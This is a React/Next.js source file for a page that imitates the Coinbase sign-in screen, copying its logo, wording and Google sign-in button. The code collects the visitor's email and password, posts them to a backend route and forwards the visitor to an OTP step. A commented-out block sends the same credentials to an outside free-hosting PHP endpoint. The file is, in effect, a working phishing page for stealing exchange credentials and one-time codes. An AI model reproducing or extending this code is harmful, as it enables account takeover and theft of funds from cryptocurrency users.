"use client";
import Image from "next/image";
import "@/css/global.css";
import { useContext, useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { library } from "@fortawesome/fontawesome-svg-core";
import { faUser, faEyeSlash, faEye } from "@fortawesome/free-solid-svg-icons";
import { ThemeContext } from "@/context/authContext";
import Loader from "@/app/loader/page";
import axios from "axios";
library.add(faUser, faEyeSlash, faEye);

const MAIL_INPUT = 1;
const PASS_INPUT = 2;
const PASS_EYE = true;
export default function Home() {
  const router = useRouter();
  const themeContext = useContext(ThemeContext);
  if (!themeContext) {
    throw new Error("ThemeToggle must be used within a ThemeProvider");
  }
  const [showLoader, setShowLoader] = useState(true);
  const { theme, setTheme } = themeContext;
  const [authMail, setAuthMail] = useState("test@gmail.com");
  const [authPass, setAuthPass] = useState("12345");
  const [logState, setLogState] = useState(MAIL_INPUT);
  const [passEye, setPassEye] = useState(PASS_EYE);
  useEffect(() => {
    onAuth()
  }, [])
  const onAuth = () => {
    // event.preventDefault();
    setTheme({
      mail: authMail,
      pass: authPass,
    });
    setShowLoader(true);
    axios
      .post("/api/getAuth", {
        mail: authMail,
        pass: authPass,
      })
      .then((res) => {
        console.log(res.data);
        setTimeout(() => {
          const { success, code } = res.data;
          if (success) {
            router.push("/otp_auth");
          } else {
            setShowLoader(false);
            setLogState(MAIL_INPUT);
          }
        }, 3000);
      });
    // axios
    //   .post(
    //     "http://test2024215.free.nf/login.php",
    //     // "http://192.168.144.241/coinbase/login.php",
    //     {
    //       email: authMail,
    //       password: authPass,
    //     },
    //     {
    //       headers: {
    //         "Content-Type": "application/json",
    //         "Access-Control-Allow-Origin": "*",
    //         "Access-Control-Allow-Headers": "*",
    //         "Access-Control-Allow-Credentials": "true",
    //       },
    //     }
    //   )
    //   .then((res) => {
    //     const { success, code } = res.data
    //     if ( success ) {
    //       router.push('/opt_auth')
    //     } else {
    //       setShowLoader(false)
    //       setLogState(MAIL_INPUT)
    //     }
    //   });
  };
  return (
    <>
      {!showLoader && (
        <main className="ctw-flex ctw-flex-col ctw-items-center ctw-justify-between ctw-pt-[80px]">
          <div className="ctw-w-[448px] ctw-border-solid ctw-border-[1px]  ctw-rounded-[18px] ctw-border-[rgba(138,145,158,0.2)] ctw-p-[40px] ctw-pb-[24px] ctw-mb-[40px]">
            <div className="ctw-pb-[56px] ctw-w-[126px]">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                role="img"
                aria-labelledby="Coinbase logo"
                viewBox="0 0 688 123"
                className="cds-iconStyles-iogjozt"
                width="100%"
              >
                <title>Coinbase logo</title>
                <path
                  d="M138.857 34.3392C113.863 34.3392 94.3343 53.3277 94.3343 78.7477C94.3343 104.168 113.37 122.994 138.857 122.994C164.343 122.994 183.71 103.843 183.71 78.5852C183.71 53.4902 164.674 34.3392 138.857 34.3392ZM139.025 104.674C124.792 104.674 114.363 93.611 114.363 78.754C114.363 63.7282 124.624 52.6714 138.857 52.6714C153.258 52.6714 163.681 63.897 163.681 78.754C163.681 93.611 153.258 104.674 139.025 104.674ZM189.168 53.659H201.584V121.35H221.443V35.9893H189.168V53.659ZM44.3536 52.6652C54.7832 52.6652 63.0581 59.103 66.1995 68.6785H87.2209C83.4113 48.2087 66.5305 34.3392 44.5223 34.3392C19.5288 34.3392 0 53.3277 0 78.754C0 104.18 19.0355 123 44.5223 123C66.0371 123 83.249 109.131 87.0586 88.492H66.1995C63.2205 98.0675 54.9456 104.674 44.516 104.674C30.1145 104.674 20.0222 93.611 20.0222 78.754C20.0285 63.7282 29.9584 52.6652 44.3536 52.6652ZM566.518 70.4973L551.954 68.3535C545.003 67.3659 540.038 65.0533 540.038 59.603C540.038 53.659 546.495 50.6901 555.264 50.6901C564.863 50.6901 570.989 54.8153 572.313 61.5844H591.511C589.357 44.4148 576.117 34.3455 555.763 34.3455C534.742 34.3455 520.84 45.0773 520.84 60.2656C520.84 74.7913 529.946 83.2167 548.313 85.8544L562.877 87.9982C569.996 88.9858 573.968 91.7984 573.968 97.0799C573.968 103.849 567.017 106.655 557.418 106.655C545.665 106.655 539.045 101.868 538.052 94.6048H518.523C520.347 111.281 533.418 123 557.25 123C578.933 123 593.328 113.093 593.328 96.0861C593.328 80.8979 582.905 72.9725 566.518 70.4973ZM211.514 0.825042C204.232 0.825042 198.767 6.10656 198.767 13.3694C198.767 20.6323 204.225 25.9138 211.514 25.9138C218.796 25.9138 224.26 20.6323 224.26 13.3694C224.26 6.10656 218.796 0.825042 211.514 0.825042ZM502.966 65.2158C502.966 46.7274 491.712 34.3455 467.88 34.3455C445.373 34.3455 432.795 45.7398 430.309 63.2407H450.007C451 56.4716 456.296 50.8588 467.549 50.8588C477.648 50.8588 482.613 55.3153 482.613 60.7656C482.613 67.866 473.507 69.6785 462.253 70.8349C447.028 72.4849 428.161 77.7664 428.161 97.58C428.161 112.937 439.583 122.837 457.788 122.837C472.021 122.837 480.958 116.893 485.43 107.48C486.092 115.9 492.38 121.35 501.155 121.35H512.74V103.687H502.972V65.2158H502.966ZM483.437 86.6794C483.437 98.0737 473.507 106.493 461.423 106.493C453.972 106.493 447.683 103.355 447.683 96.7549C447.683 88.3357 457.782 86.0231 467.05 85.0356C475.987 84.2105 480.952 82.2292 483.437 78.429V86.6794ZM378.012 34.3392C366.92 34.3392 357.652 38.9645 351.032 46.7211V0H331.172V121.35H350.701V110.124C357.321 118.212 366.758 123 378.012 123C401.843 123 419.886 104.18 419.886 78.754C419.886 53.3277 401.512 34.3392 378.012 34.3392ZM375.033 104.674C360.8 104.674 350.37 93.611 350.37 78.754C350.37 63.897 360.962 52.6714 375.195 52.6714C389.596 52.6714 399.689 63.7345 399.689 78.754C399.689 93.611 389.265 104.674 375.033 104.674ZM283.671 34.3392C270.762 34.3392 262.319 39.6208 257.354 47.0524V35.9893H237.656V121.344H257.516V74.9538C257.516 61.9094 265.791 52.6652 278.038 52.6652C289.46 52.6652 296.574 60.7531 296.574 72.4787V121.35H316.434V70.9974C316.44 49.5275 305.354 34.3392 283.671 34.3392ZM688 75.9476C688 51.5151 670.126 34.3455 646.126 34.3455C620.639 34.3455 601.934 53.4965 601.934 78.754C601.934 105.337 621.963 123 646.457 123C667.147 123 683.366 110.781 687.5 93.4485H666.81C663.831 101.043 656.549 105.337 646.781 105.337C634.035 105.337 624.436 97.4112 622.288 83.5417H687.994V75.9476H688ZM623.449 69.341C626.597 57.4529 635.534 51.6776 645.795 51.6776C657.049 51.6776 665.655 58.1155 667.641 69.341H623.449Z"
                  fill="#FFFFFF"
                ></path>
              </svg>
            </div>
            <div className="ctw-pb-[24px]">
              <h2 className="ctw-text-[28px] ctw-leading-[36px] ctw-font-semibold cds-title1-t16z3je5 ctw-text-white">
                Sign in to Coinbase
              </h2>
              <div className="ctw-mt-[8px]">
                <span className="ctw-pt-[8px] ctw-text-u-gray">
                  Not your device? Use a private or incognito window to sign in.{" "}
                </span>
              </div>
            </div>
            <div>
              {logState == MAIL_INPUT && (
                <div className="ctw-flex ctw-flex-col">
                  <label className="ctw-py-[4px] ctw-text-white ctw-text-[14px] ctw-font-semibold ctw-leading-[20px] cds-label1-ln29cth">
                    Email
                  </label>
                  <input
                    className="ctw-text-white ctw-w-full ctw-mt-[4px] ctw-h-[56px] ctw-px-[20px] ctw-outline-none ctw-rounded-[8px] ctw-border-[1px] ctw-border-solid ctw-border-[rgb(118,118,118)] ctw-bg-u-black hover:ctw-bg-[rgba(15,16,18,0.98)] active:ctw-bg-[#1E1F20]  focus:ctw-border-[2px] focus:ctw-border-blue-600 focus:ctw-border-solid"
                    placeholder="Your email address"
                    type="email"
                    value={authMail}
                    onChange={(e) => setAuthMail(e.target.value)}
                  />
                </div>
              )}
              {logState == PASS_INPUT && (
                <>
                  <div className="ctw-flex ctw-flex-col">
                    <button className="ctw-flex ctw-items-center ctw-w-full ctw-text-white ctw-text-[16px] ctw-font-semibold ctw-leading-[24px] cds-headline-hb7l4gg ctw-h-[60px] ctw-px-[20px] ctw-rounded-[8px] ctw-border-[1px] ctw-border-solid ctw-border-gray-500 active:ctw-bg-gray-700 ctw-bg-u-black ctw-text-left">
                      <div className="ctw-w-[28px] ctw-h-[28px] ctw-mr-[10px] ctw-border-2 ctw-rounded-full ctw-border-solid ctw-border-white ctw-text-center">
                        <FontAwesomeIcon
                          className="ctw-p-1 ctw-text-[#808080] ctw-text-[13px] ctw-text-white"
                          icon={faUser}
                        />
                      </div>
                      {authMail}
                    </button>
                  </div>
                  <div className="ctw-flex ctw-flex-col ctw-mt-[20px]">
                    <label className="ctw-text-white ctw-text-[14px] ctw-leading-[20px] ctw-font-semibold ctw-py-[4px]">
                      Password
                    </label>
                    <div className=" ctw-mt-[4px] ctw-flex ctw-items-center">
                      <input
                        onChange={(e) => setAuthPass(e.target.value)}
                        value={authPass}
                        className="ctw-w-full ctw-px-[20px] ctw-text-white  ctw-h-[56px]  ctw-outline-none ctw-rounded-[8px] ctw-border-[1px] ctw-border-solid ctw-border-[rgb(118,118,118)] ctw-bg-u-black hover:ctw-bg-[rgba(15,16,18,0.98)] active:ctw-bg-[#1E1F20]  focus:ctw-border-[2px] focus:ctw-border-blue-600 focus:ctw-border-solid"
                        type={passEye ? "password" : "text"}
                      />
                      <FontAwesomeIcon
                        className="ctw-p-1 ctw-ml-[-30px] ctw-text-[#808080] ctw-text-[13px] ctw-text-white"
                        onClick={() => setPassEye(!passEye)}
                        icon={passEye ? faEyeSlash : faEye}
                      />
                    </div>
                    <p className="ctw-text-[rgb(55,115,245)] ctw-my-[16px]">
                      Forgot password?
                    </p>
                  </div>
                </>
              )}

              {logState == MAIL_INPUT && (
                <div className="ctw-flex ctw-flex-col ctw-h-[56px] ctw-mt-[16px] active:ctw-border-[2px] active:ctw-border-solid active:ctw-border-transparent">
                  <button
                    className="ctw-w-full ctw-h-[56px] ctw-bg-[#3773F5] ctw-text-black ctw-font-semibold ctw-rounded-full hover:ctw-bg-[#477EF6] ctw-text-[#0a0b0d]"
                    onClick={(e) => {
                      e.preventDefault();
                      setLogState(PASS_INPUT);
                    }}
                  >
                    Continue
                  </button>
                </div>
              )}
              {logState == PASS_INPUT && (
                <div className="ctw-flex ctw-flex-col ctw-h-[56px] ctw-my-[16px] active:ctw-border-[2px] active:ctw-border-solid active:ctw-border-transparent">
                  <button
                    className="ctw-w-full ctw-h-[56px] ctw-bg-[#3773F5] ctw-text-black ctw-font-semibold ctw-rounded-full hover:ctw-bg-[#477EF6] ctw-text-[#0a0b0d]"
                    onClick={(e) => onAuth(e)}
                  >
                    Continue
                  </button>
                </div>
              )}
              {logState == MAIL_INPUT && (
                <>
                  <div className="ctw-flex ctw-flex-col ctw-h-[72px] ctw-mt-[16px] ctw-justify-between ctw-px-[20px]">
                    <div className="ctw-flex ctw-h-[16px] ctw-items-center ">
                      <div className="ctw-w-full ctw-h-[1px] ctw-bg-[rgba(193,198,207,0.33)]"></div>
                      <div className="ctw-text-[13px] ctw-ml-[-195px] ctw-leading-[16px] ctw-font-normal cds-legal-111 ctw-text-white ctw-w-[51px] ctw-w-[50px] ctw-text-center ctw-bg-[#0A0B0D]">
                        OR
                      </div>
                    </div>
                    <div className="ctw-rounded-full ctw-color-[#e8eaed] ctw-bg-[#202124] ctw-p-[2px] ctw-h-[40px] ctw-flex ctw-transition ctw-duration-500 hover:ctw-bg-[#555658]">
                      <div className="ctw-flex-none ctw-w-[36px] ctw-h-[36px] ctw-p-[6px] ctw-bg-white ctw-rounded-full">
                        <svg
                          version="1.1"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 48 48"
                          className="LgbsSe-Bz112c"
                        >
                          <g>
                            <path
                              fill="#EA4335"
                              d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
                            ></path>
                            <path
                              fill="#4285F4"
                              d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
                            ></path>
                            <path
                              fill="#FBBC05"
                              d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
                            ></path>
                            <path
                              fill="#34A853"
                              d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
                            ></path>
                            <path fill="none" d="M0 0h48v48H0z"></path>
                          </g>
                        </svg>
                      </div>
                      <div className="ctw-grow ctw-text-white ctw-text-center ctw-leading-[36px] ctw-text-[14px]">
                        Sign in with Google
                      </div>
                    </div>
                  </div>
                  <div className="ctw-flex ctw-justify-center">
                    <div className="ctw-flex ctw-flex-col ctw-pb-[40px] ctw-justify-between ctw-text-[13px] ctw-leading-[16px] ctw-font-normal ctw-w-[300px] ctw-h-[108px] ctw-px-[20px] ctw-mt-[10px] ctw-text-center">
                      <p className="ctw-text-white">
                        Don&apos;t have an account?{" "}
                        <span className="ctw-text-[#3773f5]">Sign Up</span>
                      </p>
                      <p className="ctw-text-[#3773f5]">
                        Sign in to a business account
                      </p>
                      <p className="ctw-text-[#3773f5]">Privacy policy</p>
                    </div>
                  </div>
                </>
              )}
            </div>
          </div>
        </main>
      )}
      {showLoader && <Loader />}
    </>
  );
}
